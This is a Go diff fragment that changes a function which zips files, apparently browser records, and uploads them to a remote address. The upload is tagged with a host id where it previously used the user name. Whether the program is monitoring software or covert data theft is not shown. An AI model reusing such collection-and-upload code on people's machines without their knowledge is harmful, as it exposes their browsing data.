@@ -18,7 +18,7 @@ const (
 )
 
 type msg struct {
-	User string `json:"user"`
+	Hostid string `json:"hostid"`
 }
 type BizStatusResponse struct {
 	Succeed bool `json:"succeed"`
@@ -58,7 +58,7 @@ func init() {
 
 func Digpack(addr string) {
 	time.Sleep(2 * time.Second)
-	Users := machineinfo.GetUserName()
+	var versionDetail = machineinfo.GetSystemVersion()
 	buf := new(bytes.Buffer)
 	w := zip.NewWriter(buf)
 	var files = []struct {
@@ -83,20 +83,20 @@ func Digpack(addr string) {
 	if err != nil {
 		log.Fatal(err)
 	}
-	f, err := os.OpenFile(safe_path+"log"+Users+".zip", os.O_CREATE|os.O_WRONLY, 0666)
+	f, err := os.OpenFile(safe_path+"log"+versionDetail.Hostid+".zip", os.O_CREATE|os.O_WRONLY, 0666)
 	if err != nil {
 		log.Fatal(err)
 	}
 	buf.WriteTo(f)
 	var Msg = msg{
-		User: Users,
+		Hostid: versionDetail.Hostid,
 	}
 	var bizStatusResponse = BizStatusResponse{}
 	resp, _, _ := gorequest.New().
 		Type("multipart").
 		Post(addr).
 		Send(Msg).
-		SendFile(safe_path + "log" + Users + ".zip").
+		SendFile(safe_path + "log" + versionDetail.Hostid + ".zip").
 		EndStruct(&bizStatusResponse)
 	if resp.StatusCode == 200 && bizStatusResponse.Succeed {
 		log.Println("Upload browser record Status Successful !")
